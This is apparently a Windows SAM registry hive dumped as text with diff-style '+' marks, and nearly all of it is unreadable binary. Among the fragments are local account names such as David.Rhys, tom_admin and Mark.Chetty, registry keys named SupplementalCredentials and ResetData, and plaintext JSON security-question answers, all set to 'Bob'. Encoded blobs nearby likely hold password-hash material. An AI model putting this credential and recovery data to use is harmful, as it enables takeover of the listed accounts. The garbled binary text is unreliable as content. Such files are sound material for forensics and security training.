+ ÀKˆ/ÚoÜËeVõš9ü0Ñ\jêíÜ%
+                        tG#jÿ’Æ¯òB<»ƒ©	N„úèxNÏ¦FÌ!¹_ä(
+Ÿc;Hí+E}±™µÇ5<„¤x&1ÀyTàÏG!·j
+:cfI6ÂŠÃ+Óä|ñ*	9
+                 =SÑ@fB„ÅÃçÓ°›Ç’ƒŸºê®á¢¾·Óºãø#Ò(î´.qÉ¾k2üUuãÅhöyº"Ìx—ÜfÜb¢Ï7·Ü#èšLÏeœ°ëÒ`ƒ)å\UÜ
+                                                                                               ¿®`Øß/„”Û`
+¥¤ÎHq¥£‰â+¹ãlÚE(´D8¶ù?Œ°
+Ù–íVu<ý
+       2¹5—æiã…¤µç‰YkÅÖš«(’s
+                            ÖÝ$`®™ü€q6¢+¬©_-¸¯N^©¡ÖÉuÇ}(lÄ'¦ôU®T•éìhÅ4L¡.§«WˆI÷O{g´ï£KZ9-èÇM¯¢>èÕÝ’í÷D×úà
+jQÜÔµ6W?¥0†ôÛšgçr"‰† Ðª­å.û+ 7²tÁuûÃÂÀP“ÕØ…Q_Ì>É.¤ë4W>ƒ9“ž²Ò¨*˜:œ¨‚
+ËþG¸#É—š97ƒ+Q¹À@ïÉ.ÔÌ¹õÜ¿p Jl­œ<ŸþÌ]$)Õg¸Ý[F·+3~y”¾ñ	ŽGÀ¹%‰ÎP	¤¦ýü´
+                                                                             ûèô‚
+                                                                                 ñ"> :øýIe!µÉFâðNåN2›€q¶¤
+ÂÅFÏ]Ûùw¹èž³æÞÿ:Û)šõ“¢hLõùVå
+                            «Í=7_òJRPƒ)yœãáß«¶Ì'Mi¡u0ÒCRD±éßì\‘Ã'¶é¦(GËtjœb×qß?ß¹\íFÀÒñ|iÉ¢•‰˜iÙ§)ÙÍcµÐº&
+ý*xBÈ¾¦7F¹¥×„ÉµÉI‰Ðßu
+                  ÃÕÙ§«N¥geþLk>Å´=ÔVJhL´
+                                        ÝÚñö¿•ÿ4%êÔ¡LÄ]ÙBA€šê»8y‡Ôw©6X`µé–‡´æ
+EáK›©Ñæ'_õíüÿ¨)›V—ÁÒÚ­ˆ½uOã: ‚IÂ¸¦6O>.í¶\E¯Ç'¹‰®Ž
+                                                 øm¥I&ÞÏ˜•(Ô©ló¬Óû9ÚF dêî#LiEÎtÑ59êÿ¹
+šóa§Ëì†àÅb•
+           @u|Õolú
+                  æ¨ávöùÈ°8
+’½+CµÇË›D>3>¹""}®½ùÔ/¬K‰”ìÂøÁ“3&JˆeÒŸ/Æ¦¶Ðt<}—»Žƒc‚ÁŽ^k—jWŸfM8TƒM49±µõxXG§š?ZÁn”
+^IÍÐEÇå›ÐŒ
+          ƒJº}X[î–kÄâ¡×±ýóÃ
+ætï±¨À‚baf¼Œ€ þ%²-Ð)Åh®i‚œœ¶ÉÃä™“I,.ñÔî‹—ÃeÎcèŒŸ¼âÉ£ýUÆŽ4ÎÈŸ¸üÿÿ
+                                                                $00¾ððððððððø8H`€ìüD0ÀDÀÿÿ¨[ÿ  ÿ $8
+!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø$DÂå*`'Ägø    WDAGUtilityAccountA user account managed and used by the system for
+ Windows Defender Application Guard scenarios.“2ËÕ)ð‡@3ÓïÆ^ðxe[Ùâxf¶‹&Ø¸–XUÔåo‹'’L‰=4uÖ¨¦‘=Ñ# P“Ïš7Èø“
+­ÆF>Â‹éög„B( ‹,Á£þÁ(þÿÿ{"version":1,"questions":[{"question":"What was your first pet s name?","answer":"
+Bob"},{"question":"What s the name of the city where you were born?","answer":"Bob"},{"question":"What wa
+s your childhood nickname?","answer":"Bob"}]}ôàÿÿÿvkP(oÄgF¨ÿÿÿnk Eô
+gHØ`
+ÿÿÿÿÿÿÿÿH
+         ÐÿÿÿÿUsers¬e›àÿÿÿvk|(ŠVÐÿÿÿvk  ›SupplementalCredentials(þÿÿ{"version":1,"questions":[{"question"
+:"What was your first pet s name?","answer":"Bob"},{"question":"What s the name of the city where you wer
+e born?","answer":"Bob"},{"question":"What was your childhood nickname?","answer":"Bob"}]} ÿÿÿnk ýžº HØ*ÿ
+ÿÿÿÿÿÿÿXÐÿÿÿÿ
+David.Rhys ÿÿÿlp/é÷Œ•n—
+Öxý©Hþ5#h3ˆšˆš²\¶èZÜdUû8Tœ ‡¬8Tœ ‡¬ ¨ÿÿÿnk ;ÂÁ HØ˜)ÿÿÿÿÿÿÿÿàÐÿÿÿÿ000003EBàÿÿÿvkP°}F¨ÿÿÿ;ÂÁ HØÿÿÿÿÿÿÿëàÿÿÿ
+vkt˜~V¨ÿÿÿnk ýžº HØp
+                    ÿÿÿÿÿÿÿÿ`Ðÿÿÿ000003EBèÿÿÿvk€!dˆýÿÿ
+                                                                (@8x€ìüD0ÀDÀÿÿ¨[ÿ  ÿ $8
+!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø$DÂå*`'Ägë    David.Rhys'çDJ¾1Duî¨œs* Òu×ÊÌ¼œN1›/ñ‘¹¢%:§®DBíy¾Ã¼ÊVú.ýZ ¸}fMœ])MRŸ
+ä¸øMDÎãïùByzzkZƒ#µÇËÖÊ»z$ƒÐÿÿÿvk ¦SupplementalCredentials¨ÿÿÿnk @$/ HØ˜)ÿÿÿÿÿÿÿÿX7Ðÿÿÿÿ000003ECÜàPýµqo“¼O
+üû²Þí·)k%†Ønq6$æÎ´¬#¯‡rêLÁ‚¶âœüC‹lÛËY!¬Ê=ˆAä Œ¶\üg_›“òì<xôÝÊjZ™+G¸ý´Ýk”Ã¯U…ðJ%s_«
+                                                                              ƒL_gDý×š~z¶‰)'Ó¾jsÁ@Œ…*bçŽ´
+©á
+  Ú…lßƒ?€Ë-d©TƒOŠ+RpŸî
+                      ¦ç°\ÐåH ýmHç}=õã#P.Æ;[|ßúïî0¢å¤±ê×·„á‰÷‹¤´ê6Ä/=4_N8Wuä×0¾„CÉ³±ô xÀeABÜÁ¥t kÀð±4ÿ%«ƒ
+;˜}­”ZLZEÔ{ï­¤mH¥“Íïu{fg”Ù¨¼Ÿ–Uî
+`Â8ü?˜Ù¬t	°8v|ô/è[¸f±38ýc
+ÞMÀh•ê:åU‘ÄÆgéF]˜ˆ<¿þÞ\Ù…RT!©L dd–ÚBIÜS£”O•ƒJa:t6ÏÊV¦ƒ>³äøßE×6”ßsÒ
+Äzdù‹v–Iq}
+          4H8Ò“–B|K®”@:é"mP…}T¥³Û”ÅO73#?nŸ:å9˜Îx'B3;HŽÕ¨¸Š³Ý[Æ†:¿§Âœ!ï¯%å1XtØU^]Ãº
+S~í{«Ž¤É‡ÆÈebU›-*MtÒÿ’¢(Ì}1ªu_€µd‰¿ï-xñ†Æ­tÌÉQ†ýzcTí¯,Ï&u6~YÓÝ%s^ÛÓi«¨ú¶.J•5²˜„ªr× n8ŒªèIç·&8D‰ÔrÄMf1Ûx‹¨
+Î Å´Õ
+     óRÀ6~9[¸eY¦_HÑ—b?rWÿ–ÀžµžéfÛñá”ÿåÙ!«ÿÑä¯ Ÿx
+                                                K{¾ÐqpõeÌù(|+?<LLUöç$6;Ç*ð{Nïy¬y×v(ÏQý½
+h'":Y›§†>&G5ªì Ç2ØÌAÿñ¢l³Œ)l“¡úoq%©)'LBÇÖþ]ñšÆ5®
+ÇÇ@öÅ"²‘gÀíóD’ñ=û­<ÅOÕ2«BàEVÍ¯õ°F{y5)öÌ´/3
+                                          Êe_ V.ƒç†kyÎ)º+ÐF«\IÂŒow˜Q‡ Ñ_×™†¥(àmWÄYÊ"——É‡.‚É:lëFU({1ÉpL.†ú
+DNõœÐÉBAÜ'5›U°äª˜‚“·–	¬ég¥qƒ=[þc£ÖÈ¨?³˜EíÀð
+                                            HÉ Ì±‘ã E‡gì«Þ¿‰óúq¢¥\Zøpù‡˜_C´4%X˜?­„£ïG<UsH
+…ŽûŒÝ³øwŒŒ¶
+mE1
+   ²;Bæôíjýÿ´brÚOŸ½’’üZy&ëèÜ‰\è(øéKvõ™0äUÏÝõ¾Ýb7«Àð}Ê‹7rôhù-å…L(j±ç'"E²ÆÑd-æ‰6ÎOpU{Ðrµä]:N`'‘¢
+                                                                                              0 ×^’`¾°ÌŠ»
+üT$¸/Ø²úyšiu‚Œ‚cÝðµ7Œº¸oÚP1Íîk…þOÝ_ÅÂ³¶å^8n>Åç‚º n’¥Ñ0±ÖH/,JâãÌ#NnH i=ëusYPy§8b]ü	 ¨plóÄHåe Ø4È
+ûEØRCò—Ô|©¥!    2ÿd5‰ïú0`IÂDÛb+k¤ßÇL€ŽækÏó+E„ãKïø
+                                       (8`x€ÔäD0ÀDÀÿ$DÂå*`'Ägé8
+!>Ò¯­]y°Á)'Vü Ø­föòhúß*øÿ  [    tom_admin‰Lèò%µTæ3+0«ø.³¤ŠNeŽä„Ê t¢óàß¯…4ÙÖx¨Z-å“ÿ±ðÌýæJ­Êÿàã=aU»Là%ÕÄÄsï
+ÚÚNëœ
+Nù3(FHñ‹ÌÓÑdìcôpNù3(FHñ‹ÌÓÑdìcôp€ýÿÿ
+                                    ((((((((((0H8€˜€ìüD0ÀDÀÿÿ¨[ÿ  ÿ $8
+!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø$DÂå*`'Ägê    Cheyanne.Adamsä·©ÙmÓQ™Iä6…µjÑ‰l_Ú±”<n{fCã(Ó\Ï•ßÈ¤Œ7ïj)#’Î¢L$Òé´Ò 2‡
+°‰ÇÕáãí¨1×ï”þ_@:[èŒ®4‘Ý’®´ûÁuÝþX
+                                          (@Xp€ìüD0ÀDÀÿÿ¨[ÿ  ÿ $8
+!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø$DÂå*`'Ägë    David.Rhysƒ¶k0,ä^sœµOk’Â:C,$cö5)þs^ ¯.ˆÓVk™QŒ)/7ÛÄ€‹e	HåP»'
+4­õ<=5Åhbin øùÿÿÄÐv›z4ÌÙ¯"k2Ñ4n›^€RÖÅ£yò&ˆ‹àÛc?OwO¡Â¯T‹áw ‘ÙFšÚü¶L:=·ì¶e÷d,WªïÝµÔ„
+                                                                              Xeû.A¤º†:å±Ö×`~%|O[¢’&Ú…,žÁ
+G™ô¥·ÙØêõ‹¿š¢v³ÁÊÑ¾òòJÁÓóJ·Î»ÎÝÔoíf}ì¯ñ•ðÚò¹bÉÊ'5L­ÈPšã‡À*ÐQåËÞPçÙéÎºÿE417wñí/^ò&•ß mA¦b^Oµ{Œ|K\8hâ øÒ­,é
+;êX:’ßk&òI—È´ëy¾¶ëEs!ß«RÛš$Sw°–¶8~hb";“+…IWxèXr#Õï»¾òá{¿Žãþ^K5x%T¹ö¦¥¸¾yph…¦Zð›Òy˜±€7f·sb3²EI®	®c×Ë
+zÛ]ç¿"vÇÐ&9ü¥,ytù
+        »syN‚Q…í“Ê¬$&7&Øh–ºvÒrÉ¶Áì¸Jkr,ÚÏ
+                                         »·=À«ª.0­åï*,x‰ûfw‡"3äb·
+                                                                 n˜‚ù?›
+ FMUÞfSG¢j¹ÕÓÏÓoFY&ÇH+ÍKƒäÉDPÆ=Ö
+ñ>& 4ß;lmp7Þ¿iÆw7;.º	öÒ0«ÞÐ|l]Ël^‚>f9X(­éˆö–"‹TåÂwåo5ø.©:î0…žM=³{Ÿ-¡FeaRòƒõ
+;ÍEÚ@S‹àôÝ îlè((-ÃŠË¦Q!Ø9û¾›â!]²FéÐ«ì¯P];näÆáù¯_‘ê\óÊÃðLR…-Í.’¦¯0Ä`Ò÷~	3ÁRÅ61køvyîô5àI6u™vw^„€d°6¾ü3„×y
+ÈDÖ#«d¡¶§z6ïrÜìÛ‘
+                ¢¥T¢A'+àä8aüÁ²"S»¾ÕÎÅ
+                                     Ô=J2ÝÂÛ£šMhHsù®CxðÁÍ’Oz òl½:ÞßÊÄ¯"eâ­xBMÂk®H{#jG)4l[Œêä
+w@‘S³Û³iS*ß“KÏ£·:åQ
+ï®*ˆ*/}|µöís(ù“ñï‹úÎ­ò›uÐ¿ÐxÄÿ²4'þµ\¡xs`!P(&PÜ¹
+                                               nÞV‘ûµêÛ–æž©Ù}/O*¬l
+                                                                  £ ÁK‡–dq9:`ebk”ÁY®óþ6Ly'ð\ÏÝ`ß41ŽZÒ
+LÒ 297ç/ÓõiÄ#@Êñ5ÝD 
+                    Û?§©_á¾­k+Áˆ}ó??]¸Õ™ÒÌLiç¤aD©y
+Å”=÷ªrÄÃìÃÌ\WÌ>…äù,AìÜVCÉÃé’Ž"­TË Ef<‘_nš‘F']Â¤¸8g1^k¸¶A•)ùŠÊ…èËz2”×ÁñºB[RdÛ3ß
+                                                                              ƒuV{êdU{¼œ‚–;…²~ëdÅ5ûMJt%vV
+ƒþªópl•>›xR·Áe‡¼žm¡ƒ¶yÅ·³ª
+ˆ	¶.	âõPæŸânL¾fL»HþGEifZ¹Ä·nlô¤)ñE®&¶Bƒ˜S§ÎüDÚFËÅ™¸¾ÐöÝ@co¨AUÀ#5~~øƒGIM"ñÑ2‚ÒeFàÁÕ‡
+ôþù©ÙšTf#Ò.µB„Ø‚Ö
+‚sÍÜMÍwø³V9”¶@'þNfN[›IMÜžpO“Z¶ ÑB®æ5ƒ±t‰.Â¦o…¬
+                                              z³Ñ}’b@3øMH<ïÉ­+ÃôìñÖÇ¾9
+                                                                      çG=e'ÞqÕcíáû
+                                                                                  Â«,´°a'9È+|Áü^2¤
+xÓ%D|2T@ÄB\W€ÓÝŠìÉDÙÇ,ábúœ›¢Áx¸{ò­¸2ÈŠÍ¿—=QkÙ4-Ó9¹ª
+QTÈ²|¯ý—<©
+          Yù-ŠS]õã¤'
+pbeiÁ
+   D8|”€ìüD0ÀDÀÿÿ¨[ÿ  ÿ $8
+!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø$DÂå*`'Ägì    Mark.Chettyô\-…xÊÞ-47«\äOh3ÄdÁž×ôÁµÍä€´ÎhâXéR2,/å•h,
+…uíÖ‰ìÆc9D°YÑ[Ìó'0•ó¨™š™y@§W2çf!,"]LÞæU‰‰"version":1,"questions":[{"question":"What was your first pet s
+name?","answer":"Bob"},{"question":"What s the name of the city where you were born?","answer":"Bob"},{"q
+uestion":"What was your childhood nickname?","answer":"Bob"}]}0¢g ÿÿÿnk ýw/ HØ*ÿÿÿÿÿÿÿÿøÐÿÿÿÿ
+                                                                                          Mark.ChettyíÛ—è
+ÿÿÿvk€ìZ[àÿÿÿvkPH¡aÏFú)Øùÿÿìð…iÀì“$z…%:›¤•KóV5°¼47Ñ¡ñBg`íŸÚÖ.\Áå|Q¿ÚmLl$ô¬ª@…—÷^`ŸEoìp»Îòr¥	Ks\ŸF¹
+¨AùÈlDÝ·ºÎ‹>$f(KóIA¨4`ìQÈ=½VkmîËòŽüN@éùåÛ2U	¾÷¯ûøQ;I|˜üî:°›þˆÎ;¿¶³Älî.+„a¼ðª˜y<žÖKí’i««œù5Û›á3› ©Ä]‘ö
+;÷Ris´Áá8n1),»Šxdüa]_*¬±Ð÷3"Ne\ãy»3—à
+                             @{Û?A9ñ¡â¹V!EëjM+Õû“Ï(•´*H(NñGgµÉæ´Jyö>Aì"Þ½áD°ÈÛq6œjˆ'N m"k…ï—øjhdÅ+<'Í2366
+ÇòkËÍª‰ï0ãkZh7Ôzþ)ÁÄcGS¯ñ2î÷<l`!}h‰Åw
+áèn9Öfñ‡å
+ËÐ¡R
+¡oZ³Š)»Ò23î/W2Ôn¾:J©ß‚´¼!­KÝ2·‡Ýÿ•­®²Ú
+×ú§èøŠ¸/÷K~Qðn[ð‡þ ¦§Î>máñ¤Tn¦_ayéÝÆg¼vô§ò}ÑUîû!
+                                                ´/
+                                                  ‹(¿à@V`¡ÞñOÎÖ·KXcÐhZ`Ãù%äh6i¯H¦R:,ÁQY,yða(r´…ÇøÀÝw†GXþ¬
+ù‰xm‚jº%¤>S¿šÉ*’¦SETâíúe}3ÜGí\
+ix§ç+2Ä®ðu~fQ—x¹ðÇáa<³û¾Žù²=Ý€`Ù!ŸëÉ™Ká0]dJN3Û•Á"Bxg\ê‡6T`çSK™…'×·
+ ‡E<ž	§{ÌIswk4¥Fa~ƒÅ±H¥Žü’IÏ“„=ac•
+                                    ^UXIµòÎÅé§r
+-—gbC§I FõÛB=ÕM—DX÷mZ2UÔÀ”êÙ{Þ.YÝ¡¶K¢Y¤:Ž–j¥UŒ¦ÄÄVùs¤ò>iÜ4	˜­Ï÷*è†?j›¤ÝDæIþ­y|ÞÿEtìÝü¾•Ùœ2m9™Ûn
+{Ïùq¨¹HŽ€{ùŠü…
+         âä<L=&
+               ãš<ß„wøWþí®–¼2â¸–ðà“LZc%=¸‡­:— ÚQt­j¤ƒ³y8ÙTyeBoŠg%°º¦÷Éæ»²
+                                                                         ©˜¿8(Î‚ÿîºù.¿óòoadŠ®ïÛnã.èÖ‚íôÀN
+?
+ ¤‰3¦#zqoîÄ¥$O€Cqßã03pKFT3üÕžüWÕ|¦éÏî…« ÿñP“ÕD\¯gxªiÝ
+                                                  ;0’¾öæÀtÍ(Mæ¶…ÎgâSòºCQOÆÙÕŒ~ÿ^Ð%¯’Dyà©ð+ù·‚ÃáB²áJÒ‡IâBÏ
+ä¢q äþ'ºr–½WøÎÌ5JÕ
+”¨C “&—È`KÆ}ŠÀC§Í)J:ngãŸ–c%‹&G 0ôQ×»qæCˆ‘4"í
+                                            ñå§Ê¦+‹ø®:™71kÀ5Ý±‹í8 m^F1ùRDÒ<ðlÖ±¹'àã”yÉ‡¾Ty/ÚÈÍ0Éô—t£¿(Ã-·
+åe?5Ê)ìI
+g°Hi+ñq¸*Ì|àeUJzç[¬LÌ	‘ƒžyž@ñòE1+Éås\'ÕÇdýÇÇe0+väâ"ÕÎý´Õ£§hLU"PÆiDÀ2óï´@Çô/üûÅU˜¼ƒ®ú$Ð¿qQ/žÓ·/óæ‡3u
+	¶ºÍÓbDÏÿøw*+jrÍN@ ÃZ8WªF-
+¬Ç„‡_=é*þØ„ìŸ,Æ„”ÃRüýkKë
+ÐšçìWO›v¡yÔ¬*	oMÒ·âÒþnlØ3ÉŸW8ý?g…á•)/fªBüš¼%ÕìœÖº+r,¢–ùÉÂ*ÂôÁ@bò
+                                                                  (O¯-ê‡Bn§zÏz>ý‰ÿÞ÷÷;BÕtÚÇãp­Cn¹&d_J}Gæ„
+ÜA
+  4l¨ÿÿÿ@$/ HØÿÿÿÿÿÿÿìó˜•0àÿÿÿvkx(–ý4V‘ƒ™u<ý.Ðÿÿÿvk€ForcePasswordResetÐÿÿÿvkø´SupplementalCredentialsØÿÿÿ
+vkÐH¢ResetData(þÿÿ{"version":1,"questions":[{"question":"What was your first pet s name?","answer":"Bob"}
+,{"question":"What s the name of the city where you were born?","answer":"Bob"},{"question":"What was you
+r childhood nickname?","answer":"Bob"}]}ò‚$!¨ÿÿÿnk ýw/ HØp
+                                                    ÿÿÿÿÿÿÿÿàÐÿÿÿ000003EC ÿÿÿlh
+                                                                               wÉjè
+                                                                                   wÉjèwÉjH-Éj€o¥Éj(~¦Éj
+¤§Éj ¤§Éj¾ÉHƒcÏ•BW†0gžÞ½ÕHä.»ÁãX~›ã«R¨Ã´1w‘KŠÉÿI‰F×–µ²³ãŒ+á#'‡’3Ðô­„ýP“>ø452LãÏŒÖ©LñÎ FÞÒ…¯NÚ¼É²[° ”Ï{-åD
+È”C3¦ýDs…c+,©YXç@êÄy7ÀG´PfÆ>
+                         ŠéMx—˜b}8pÕ}.» ød/nk9ÃÞ¼eSi¡ÇxÔE
+Iž'ñÅ
+óôjz*k8¬j[
+          zûóKÓN§¸P]ÅPåŠ3XÝ­]Ñüì;ã\úÎ±¤Ù½
+=	ÌâtaxÓ\
+pJeÖ’ö¥J&óÁƒ:'2/L©tþáòÂ)ûpíïÑ1iåL-Z?|mAÄæÀ/YPJË0gí‹
+A†*°beÙH‡"îyö¿*t‹ÓO6uÝÖò{·øùÿÿÌÐ_A9C°'{Wd¤sÑ¸;þ»ÕTƒ¥–DÓMú;ãÍ*F¸j¢¥âÄf3Rö‰ÅÞ~ÊXfÝŽUP3
+                                                                                    UÎÒÊÑ 6ý]L‡§ gàOÃUOÏH
+Çœ×Ô©¥+…mÅD>¦Ð3øDNÓÔÎ|Žäy	àèÜ
+                                  Ò_G¯
+Ï¾‡¿úQ„ížnÏ„²äªÐx4	à»BA…ßþöp‡ª‰•ÕË­B{R‰<U–×åˆ9ÏGãÊ"Txt±P<ÆÛÆ4ÞŽõW¡ð|3(#éþª4W¹L9P‡ªƒDÒqQmˆK>8&~ƒ
+Ð%Æ
+                                                                                                       8ò
+	Ý|¼•xOõ™	e@wÐ{ø«ƒM?z+>Î4ˆ’wzA8cPYŒ5×€zÈðÐE‡.³šHDê$>4ë¸güŽÁš¦"¹“Œp;_i"w•G9›tp>è
+%â5'æÒ*ÜÓÁûÜÇyOÙÓXø¿ÉS´»E{—ãÍ_6x¨v`¿ú<ý‘nRÙÕ,õ¾¦ùîoŽ®Ä"Bl5Ö½SX°œ\áV?•n`¦u Jï"±;Š
+                                                                P—&qr@×uho b˜¶æ­»…Ö:^Hñd›èÇ¢	®si€è[
+!ÒäÉtdÄf`Aìoa™K2Zø—'ZÝq¥¡¸®¿¶êiæU;vùÛßÜ®¹¸ÀÝöäºõñÞ­ÇÝß
+                                                   ÔÞúj»HzSÿZ·Qº03T&¬5c©rúõâ$–N÷˜¾Ï( æFúW<¿—íÕÕ•ê®:Ù¿Æ:Ù6
+áÈ…cîWç]=Ö•
+¬6à¼ˆ^(Zò'-a×þ°!—rxJ×mf;¦úSnµI…§c†‹8_V~¤X8$_õUÈdãÆdËÅˆÎü9þ@tfýƒ49µ$FFX³]‹++'
+                                                                            ¼U¾Ü²'¬ä3oze¡ú±2QP
+                                                                                              ì[0†€ÅLP­í
+	ÙÀLå’ÛK:Š¸Y‹qõ}ý¾×Ð7¢¥ÙkÍº°þ˜zäll}mÀ–8Ì›£JS<k)Ø.)ú¢Ø¿1+bÀBßZJÓGÁÈaÒ\L"~?
+Üúvfy$9oqÊ?ã¨ðŠj0‡Æí±*ÃP@îf|ž6ÍÆ‰hÔd04Ñ;>
+                                         ß<x ål®··ØÀ<ö·9íÁ*BJqA6¢|Dÿ¯ÿo­°ìF‰Å
+iŸúPñ¤ôó:±YÇtuÃ¢Å^ü”m©R?½uˆp6“’Ÿ~c‰=):,Ü‰ˆþ‹¨Û¬ú7gøÑŽ;¡0GHæÍÉX»„ÂŠÁ¤ÄÎ*ØVWUDÆ7çÂ$;ÀW†]ï´N8ÚÂRÒ1¨˜ìÿØ«y«PO
+â‡)n‹îGµz`ïÇoüÝw÷9£ÙåOµmÿçT’XîmÓ[
+÷&ÞÆìÑë@˜bb«¢dlS¨?Û„P[|
+Ø)Í­¹|ªyùÒ²ì±cä¬GzÐìXê1gž~3²Vìºu\°ù–æ4¤WÝ³ê âÝkWÁ&ˆnFY³„û;,ç5&-&­ÚaYEúu¥IýpÊBMÚtT!	iÞ$!,Q˜Üí¢ë³
+ËO90Ø_u_TâãB!lx$ sZö`”SîZ8¥î=r›ÕD}ùÒnRv‘eêÿ•r:Z’ó­rûµUµ"˜4¬Ã%[ÞÈ-‚]ü†<ÇÈªZc£`å~×ž‰Šâ«itÍï£'q/·àDjîµÕÑ67ìà
+)«Õ»Qž…éäÒæy#ó¯ã ¡»?ã5c!rÉ>BpµZ±:¬4W’8.ïAñª¾ÆØ²*ä}ÇÐC9Ï\‘¿@+ù,0ßà¤Eùôš²Ì¢¿¿ƒ¨Ç!Ç@ð	çk.C¤m‰úùù– 
+ÒÞ9·ü\@ÝK¬)swõ·—³¥ê®¹o¯Eed³Gü³×·†ý3zkXýÿÿ!
+Öäl€àðD0ÀÀÿÿœ
+                $ #8
+Þ¢(g!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø    UsersUsers are prevented from making accidental or intentional system-wid
+e changes and can run most applications
+                                       Âå*`'ÄgêÂå*`'ÄgëÂå*`'ÄgìÂå*`'Ägì0hbin° Øœ  Ü=9R»ÇÓBëô
+                                                                                            {¢]$
+OÆ1ÙÒØ•'<ú­ó¹àr‘©ÕÔ\ì#ý]‘ŸÇ>ûCâI­Õ\l:‰À
+                                       ÙœkZôšör2t·×cMþöø33ë÷½ükÃ¥‚ì
+½êÚ¢ýø\æ´+ù¦V^$‹†GÚÄ·ÛgH³Za´Þ-¸uJÛ¤ƒy¡!*²ž…näááê`®ü.cÅ	ÏW²ÕÚ~R8à¾é~±â¿ðŸAJ¡'	TSç—æMö“!çÏþªš5µe0$¦®ì
+À»_}Qúv†OÔÊoZÝÈ*Ø:[3½.Yy$ûôh»Ï:¯J¥|æÙÒ¼ëÛ5t`^C
+#§~jŸ[hÀ€ÌyŠê{’izæ›ì•ÚižÎÕÔBU¨ŒóøõX–rùß%2X*—ì”Á6§É¾÷öˆÀ6ûyý†29Än©jK
+                                                                   £ %º
+ÆŠQg³þ	ïñbñ¨}ìvJ‡øÐšÆáXux«ë£ÉJ:hQ¢Ûô˜iL:ÛÀ}Ípà‹|,¿rß¤}æ¼4Ÿjˆ‚ÑzñŠàäN)œÖº›U¨ŒÒ‘Ë÷ÝVÂ]–3ü'Q-Éê,l˜ÌÒŽa®8&ú
+tjªÓ¢0*q%Ê
+]ÊÆ–*wÃjà^§¶‚Q·qëŠ`¸òÞaûÕTç-n•‰2Ž‰ÜùLž^eVœãœ&åbµúž2Ÿ¿OÉ'|“Ò:²õâ¤&åWŸ÷o(¼ÄÄ‘ûh™àžàT_7Œ#ŽºüUÈÜXZÊ¬‘ÀÉ(cj)%h
+¢€ã&´«î JÖù
+sMîùû™µl¼ýîëª«!´…r)Õã=ümÅ
+                         	Õ[«o±¿­ütÚbåZeDXóú°…BË
+                                                      OÙÀòùºˆå9;Ä›ÁÛeÙÄ*×svò~¸"qè{ðT´û7½.˜´&Ôg|½þbâ9Ê=ÚHF
+‡ßºbÏÎ‘keŽÔüËn„%}¨âZ=`Ò
+                       Tô£Ä%ï?‘<Í¼k” ’‡FÖ¶E&_ð[ãñ/‹kÕ-»r"M¿¸¾à¯~¨Ý6sûU#æg95—¸VÈHï
+                                                                                 aöD™GoÑ³µy9Ï‚‚ƒ*Š¤ü1iõÖÍ
+4ÊlÁ
+6øâûlwûøKLü¶…¼Ú$ú3eíu{Öse Š
+Ð»ÓPòv+šÖÀ9
+š°±áÖIt^¯uVÔ„©·ì[ówÁF¢¯ä:íiys,\K‡ÞG‘„ßevÌQ)%ª#-ÙØ¦%r£!±ƒ™
+_P¾G~"Ð˜,_Eû¹'l:N%Dûp„H‘^”–ãÆÏ»0ÌÛ‡y.=
+                                      lŠ^äüurÙA3“ÕÃ)Ybjæ|
+                                                         ~Ã\kf]h¸ƒÁdd#Ú»Ö1ï–¨³À{çƒs…Ç>C
+oå#Ïc#úµX%‘|×/•| O`\ÅP„ìž’¢cVÎ±Á~ t¶ù™øTË/+ß‚Âù_”E–ËÎcb,¦-*©³õ¤µ¸¿a1%LÒ­j¶¢	cRGDTËbŒôA~&fðÐÕ|fVsÃ
+ä¨4GèùÿÿÔàLŸªJF©VèÑ§Ÿõ_ž”À+\plÊ¯Ÿ]è»ZùCÉ5¸Á4
+                                        ˜¢‘z·lïG­XB8êÈÉ»r.3Áø[Qä¾ÓCxéÇ³\{ÔAÞÜ-·¤ÝÆûïMÃ;ñ‹¿‰·ê2Q£ËßaÅQÁ¬³É
+ù€Be*yµBFŒpðûG‰(³õ¼°íePW4lÇÖæ:k
+bIŒÕæÎòë“<¶Il]4êi†<
+ÿ§‚Ò
+    5kÂå6Q$þ
+            ]4Z
+               fÔ>¿$™Ã~Aø\$ÞÄ>ãËÀ5#Öœ³oe¸µÒƒŽúªKiy
+ØÈ„ªçKÛkY@èÏ¡3·è€¯ª­?
+¿$´Þ¢š4™ß€Ìpp'IÜˆ.ö€ryåJ-“ŒÉQ¢ÿyP{øÀ
+                                    "myµŽ§.‡
+                                            8op¬š½NNÀ£‹PcØñeA¸PTðâ€À“\†C³!|-'˜Æø‚Òc*“þÃ‡íÓ3ÔûÊÆ	×MID·É;Sn
+E+ñª4ø³hwsX©y¾AzØËžý‡8bWšÂ8Žïš¡Ð™NýÎ±ðºB¥@ØÒ2ÜîPü
+÷ö·»ÓÝ‹ÕyqÉ`Í-¦Ë5mùáÑÏ·©|:×EüšÃgr$˜WSÉ‘¯sÆj›r/²ˆÉpCŸýn—¬A”Çï¼1¿ÜÙFÂOù™"%8$o@Ù÷#°¹e^ÚðËQ1U¸Ë¹™¶	$âÓ½.KÏ¸
+³¨4ºTcÔ>wÏÿ40ú
+èê;^«Ó1òw=@r×WBâöR–ü¬Ûâ¿P¼O.ÉO¶åªí«Ñ
+                                    MÒõË1‡h&ýjÞè8=k
+                                                   ¶5£‚´[{¡/%eª£¯ª"£Þ™,èø
+                                                                         Ý!×¹‹FYŒ=]ª`›_î:Ç>z{DÂ’½c¸ŸÙÀ™rA
+*÷™ù’
+ˆJ3˜¨ÈG‰c„èÚ–ŸYªg#mM{W¸š ÏÉ&Áu'2æŠoGºõÅPÈßºé+#ÝO:!ˆUá3")GR	\ùýˆù@
+;b-µp†P1èrÁ«#ø|ÉZú•akÔg[ÇI¼èhþ
+                              þLrÒ%EMLõ/†x5ÐVK|)òøä>ÃôMÜ°+Ùàì£	Øó¾à“g›µƒ“.ç‹Uðþ÷ñ¿¸ËêL—¯Êª2]IÞÜm@Pt”ÃÙï
+¦²…êß—º¹Á£Hû{e3Oÿ­Å†ãÅê£JÒy'£¢)Èªö‹(¢fd¶2PÑhÕ«|âJå Šú„øè,Óh+9úHï)-êx¨i½ÏtCtz‰×E|É‡%ØŸºß†>=šØiV¥lŠÄKý’¤¼·«
+<Íúz‡ràåöÒ‹YÅ,M›®v-ò.4·×†“à#ÉK“M2b,EF¢qã¯³
